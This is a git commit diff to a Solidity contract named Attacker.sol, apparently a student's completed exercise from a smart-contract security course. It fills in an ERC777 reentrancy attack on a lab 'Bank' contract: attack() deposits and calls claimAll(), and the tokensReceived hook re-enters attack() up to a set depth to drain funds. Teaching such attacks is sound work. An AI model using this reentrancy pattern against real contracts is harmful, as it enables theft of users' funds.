fb82adcc10f42110770df164c81b8c61935fa51f
Jannabanana1 <66581721+Jannabanana1@users.noreply.github.com>
2023-03-17 19:01:33 -0400

    Update Attacker.sol

--- Attacker.sol
+++ Attacker.sol
@@ -10,13 +10,12 @@ contract Attacker is AccessControl, IERC777Recipient {
     bytes32 public constant ATTACKER_ROLE = keccak256("ATTACKER_ROLE");
 	IERC1820Registry private _erc1820 = IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24); //This is the location of the EIP1820 registry
 	bytes32 constant private TOKENS_RECIPIENT_INTERFACE_HASH = keccak256("ERC777TokensRecipient"); //When someone tries to send an ERC777 contract, they check if the recipient implements this interface
-	uint8 depth = 0; //Keeps track of current depth of the recursion
-	uint8 max_depth = 2; //Maximum levels of recursion in the reentrancy attack
-
-	Bank public bank; //The bank contract that we will attack
-
 	event Deposit(uint256 amount );
 	event Recurse(uint8 depth);
+	uint8 depth = 0; 
+	uint8 max_depth = 2; 
+	Bank public bank; 
+	
 
     constructor(address admin) {
         _grantRole(DEFAULT_ADMIN_ROLE, admin);
@@ -36,17 +35,12 @@ contract Attacker is AccessControl, IERC777Recipient {
 	*/
 	function attack(uint256 amt) payable public {
 		require( address(bank) != address(0), "Target bank not set" );
-	
-		//YOUR CODE TO START ATTACK GOES HERE
 		if(depth == 0){
 			emit Deposit(amt);
 			bank.deposit{value:amt}();
 		}
-		
-		
 		bank.claimAll();
-		//if (address(bank).balance >= 0 ) {
-		//	withdraw(address(this));}
+
 	}
 
 	/*
@@ -70,16 +64,11 @@ contract Attacker is AccessControl, IERC777Recipient {
 		bytes calldata operatorData
 	) external {
 		require( address(bank) != address(0), "Target bank not set" );
-		//YOUR CODE TO RECURSE ATTACK GOES HERE
-		//require(msg.sender == bank.token.address);
 		if( depth < max_depth){
 			depth = depth + 1;
 			emit Recurse(depth);
 			attack(amount);
 		}
-		//require( depth < max_depth, "Over the limit" );
-		
-		//bank.claimAll();
 		
 	}
 
